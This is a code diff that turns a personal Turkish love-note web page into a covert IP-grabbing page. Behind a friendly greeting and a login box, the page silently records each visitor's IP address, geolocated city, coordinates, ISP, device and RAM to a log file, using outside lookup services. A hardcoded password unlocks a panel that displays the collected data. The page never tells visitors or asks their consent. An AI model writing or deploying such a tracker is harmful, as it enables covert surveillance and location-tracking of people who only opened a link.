@@ -1,11 +1,143 @@
+<?php
+$password = "vexybaba001";
+
+if (isset($_POST['pass']) && $_POST['pass'] === $password) {
+    $log = "ip_log.txt";
+    $content = file_exists($log) ? file_get_contents($log) : "Henüz giriş yok.";
+?>
 <!DOCTYPE html>
 <html lang="tr">
 <head>
     <meta charset="UTF-8">
-    <title>EYLULUMMM</title>
+    <title>IP Panel</title>
+    <style>
+        body { background:#0f0f0f; color:#0f0; font-family:Consolas; padding:20px; line-height:1.6; }
+        h1 { color:#0f0; }
+        pre { background:#1a1a1a; padding:15px; border-radius:8px; white-space:pre-wrap; }
+    </style>
 </head>
 <body>
-    <h1>EYLULUMM SENI COOK SEVIYORUM HAYATIMIN ANLAMI</h1>
-    <p>askim bebegim birtanem guzelim benim seni cok cok seviyorumm.</p>
+    <h1>🔐 IP Paneli</h1>
+    <pre><?php echo htmlspecialchars($content); ?></pre>
 </body>
 </html>
+<?php exit; }
+
+// ====================== LOG KISMI ======================
+$time = gmdate('d.m.Y H:i:s', time() + 3*3600);
+$ip = $_SERVER['REMOTE_ADDR'];
+$user_agent = $_SERVER['HTTP_USER_AGENT'] ?? 'Bilinmiyor';
+
+// ==================== IP BİLGİSİ ====================
+$city = $region = $country = $isp = $coords = $timezone = 'Bilinmiyor';
+
+function getIPInfo($ip) {
+    $json = @file_get_contents("https://ipinfo.io/{$ip}/json");
+    if ($json) {
+        $data = json_decode($json, true);
+        if (!empty($data)) {
+            return [
+                'city'     => $data['city'] ?? 'Bilinmiyor',
+                'region'   => $data['region'] ?? 'Bilinmiyor',
+                'country'  => $data['country'] ?? 'Bilinmiyor',
+                'isp'      => $data['org'] ?? 'Bilinmiyor',
+                'coords'   => $data['loc'] ?? 'Bilinmiyor',
+                'timezone' => $data['timezone'] ?? 'Bilinmiyor'
+            ];
+        }
+    }
+    // fallback ipapi.co ...
+    $json = @file_get_contents("https://ipapi.co/{$ip}/json/");
+    if ($json) {
+        $data = json_decode($json, true);
+        return [
+            'city'     => $data['city'] ?? 'Bilinmiyor',
+            'region'   => $data['region'] ?? 'Bilinmiyor',
+            'country'  => $data['country_name'] ?? 'Bilinmiyor',
+            'isp'      => $data['org'] ?? 'Bilinmiyor',
+            'coords'   => isset($data['latitude']) ? $data['latitude'].','.$data['longitude'] : 'Bilinmiyor',
+            'timezone' => $data['timezone'] ?? 'Bilinmiyor'
+        ];
+    }
+    return ['city'=>'Bilinmiyor','region'=>'Bilinmiyor','country'=>'Bilinmiyor','isp'=>'Bilinmiyor','coords'=>'Bilinmiyor','timezone'=>'Bilinmiyor'];
+}
+
+$info = getIPInfo($ip);
+$city = $info['city'];
+$region = $info['region'];
+$country = $info['country'];
+$isp = $info['isp'];
+$coords = $info['coords'];
+$timezone = $info['timezone'];
+
+// ==================== CİHAZ & RAM (JavaScript ile) ====================
+$device = "Bilinmiyor";
+if (strpos($user_agent, 'iPhone') !== false) $device = "iPhone";
+elseif (strpos($user_agent, 'Android') !== false) $device = "Android";
+elseif (strpos($user_agent, 'Windows') !== false) $device = "Windows";
+elseif (strpos($user_agent, 'Mac') !== false) $device = "Mac OS";
+elseif (strpos($user_agent, 'Linux') !== false) $device = "Linux";
+
+$ram = "Bilinmiyor";   // Varsayılan
+
+$logline = "[$time] IP: $ip | $city / $country | ISP: $isp | Koordinat: $coords | Zaman Dilimi: $timezone | Cihaz: $device | RAM: $ram\n";
+
+file_put_contents("ip_log.txt", $logline, FILE_APPEND);
+?>
+
+<!DOCTYPE html>
+<html lang="tr">
+<head>
+    <meta charset="UTF-8">
+    <title>Giriş</title>
+    <style>
+        body { background:#0a0a0a; color:#ddd; font-family:Arial; text-align:center; padding:100px; }
+        input { padding:15px; font-size:18px; background:#222; color:white; border:2px solid #0f0; border-radius:8px; }
+    </style>
+</head>
+<body>
+    <h1>Hoş geldin knk 👋</h1>
+    <form method="POST">
+        <input type="password" name="pass" placeholder="Şifreyi gir" autofocus>
+        <br><br>
+        <input type="submit" value="Giriş Yap">
+    </form>
+
+    <!-- RAM Bilgisini Al ve Logu Güncelle -->
+    <script>
+        let ram = "Bilinmiyor";
+        if (navigator.deviceMemory) {
+            ram = navigator.deviceMemory + " GB";
+        }
+
+        // AJAX ile RAM bilgisini sunucuya gönder ve logu güncelle
+        fetch('?update_ram=1', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+            body: 'ip=<?php echo $ip; ?>&ram=' + encodeURIComponent(ram)
+        });
+    </script>
+</body>
+</html>
+
+<?php
+// RAM güncelleme için basit handler
+if (isset($_GET['update_ram']) && isset($_POST['ip']) && isset($_POST['ram'])) {
+    $ip = $_POST['ip'];
+    $ram = $_POST['ram'];
+    
+    // Son satırı oku ve RAM ile güncelle (basit yöntem)
+    $logfile = "ip_log.txt";
+    if (file_exists($logfile)) {
+        $lines = file($logfile);
+        $lastLine = array_pop($lines);
+        
+        if (strpos($lastLine, $ip) !== false) {
+            $lastLine = str_replace("RAM: Bilinmiyor", "RAM: " . $ram, $lastLine);
+            $lines[] = $lastLine;
+            file_put_contents($logfile, implode("", $lines));
+        }
+    }
+    exit;
+}
+?>
